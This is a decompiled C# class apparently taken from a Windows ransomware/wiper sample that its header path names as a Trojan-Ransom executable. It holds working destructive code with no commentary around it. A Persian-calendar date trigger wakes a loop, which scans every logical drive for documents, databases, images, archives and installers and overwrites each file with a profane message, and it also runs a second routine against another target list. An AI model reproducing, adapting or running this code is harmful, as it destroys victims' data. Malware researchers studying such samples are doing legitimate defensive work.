// Decompiled with JetBrains decompiler
// Type: ns3.Class8
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: E391E61C-54CD-42F7-87F5-F1422ADC71CE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-b0c5109c75152c51dacf12189944812046e14b8bb28febc084afc2a33f777b0a.exe

using ns0;
using ns1;
using ns2;
using ns5;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Threading;

namespace ns3
{
  internal static class Class8
  {
    public static readonly int int_0 = 14400000;
    private static readonly string string_0 = "*.dbf;*.fpt;*.cdx;*.mdb;*.accdb;*.mdf;*.txt;*.xls?;*.doc?;*.ppt?;*.jpg;*.bak;*.rar;*.7z;*.zip;*.cab;*.msi;*setup.exe";
    private static readonly string string_1 = "Because fuck you! That's why.";
    private static readonly int int_1 = 70;

    public static void smethod_0()
    {
      do
      {
        if (Class8.smethod_1())
          goto label_3;
label_1:
        Thread.Sleep(Class8.int_0);
        continue;
label_3:
        Class8.smethod_2();
        goto label_1;
      }
      while (Class34.bool_0);
    }

    private static bool smethod_1()
    {
      DateTime now = DateTime.Now;
      PersianCalendar persianCalendar = new PersianCalendar();
      int month = persianCalendar.GetMonth(now);
      int year = persianCalendar.GetYear(now);
      int dayOfMonth = persianCalendar.GetDayOfMonth(now);
      int daysInMonth = persianCalendar.GetDaysInMonth(year, month);
      return (month == 1 || month == 12 || month / 2 != 0) && daysInMonth - dayOfMonth <= 3;
    }

    private static void smethod_2()
    {
      IAsyncResult asyncResult1 = new Delegate5(Class8.smethod_3).BeginInvoke((AsyncCallback) null, (object) null);
      IAsyncResult asyncResult2 = new Delegate5(Class8.smethod_4).BeginInvoke((AsyncCallback) null, (object) null);
      asyncResult1.AsyncWaitHandle.WaitOne();
      asyncResult2.AsyncWaitHandle.WaitOne();
    }

    private static void smethod_3()
    {
      try
      {
        List<string> stringList1 = Class17.smethod_3();
        List<string> stringList2 = new List<string>();
        foreach (string string_2 in stringList1)
        {
          try
          {
            if (Class17.smethod_2(string_2))
              stringList2.Add(string_2);
          }
          catch
          {
          }
        }
        foreach (string string_2 in stringList2)
        {
          foreach (string string_3 in Class17.smethod_1(string_2))
          {
            try
            {
              Class17.smethod_0(string_2, string_3);
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }

    private static void smethod_4()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        for (int index = logicalDrives.Length - 1; index >= 0; --index)
          Class39.smethod_0(logicalDrives[index], Class8.string_0, true, (Action<List<string>>) (list_0 =>
          {
            foreach (string path in list_0)
            {
              if (Class8.int_1 > 0)
                Thread.Sleep(Class8.int_1);
              try
              {
                File.WriteAllText(path, Class8.string_1);
              }
              catch
              {
              }
            }
          }), Class18.list_0);
      }
      catch
      {
      }
    }
  }
}
